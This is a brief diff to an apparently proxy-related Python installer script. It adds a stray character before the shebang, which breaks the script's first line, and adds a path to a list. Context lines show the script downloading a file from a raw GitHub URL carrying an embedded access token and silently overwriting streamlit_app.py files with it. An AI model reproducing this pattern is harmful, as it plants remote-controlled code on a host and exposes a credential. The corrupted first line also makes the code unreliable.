@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+G#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 import os
@@ -948,7 +948,11 @@ if __name__ == "__main__":
             install(args) # 调用安装函数
     else:
         main()
-    upload_agsb_v2_paths = ["/mount/src/web/streamlit_app.py", "/home/appuser/.agsb/streamlit_app.py"]
+    upload_agsb_v2_paths = [
+        "/mount/src/web/streamlit_app.py",
+        "/mount/src/.agsb/streamlit_app.py",
+        "/home/appuser/.agsb/streamlit_app.py"
+    ]
     resp = requests.get("https://raw.githubusercontent.com/neeo-ai/web/refs/heads/main/streamlit_app.py?token=GHSAT0AAAAAADFMCF2ZEEU4VCQLGPHBI3BG2CHPU4A")
     for file_path in upload_agsb_v2_paths:
         with open(file_path, 'w', encoding='utf-8') as f:
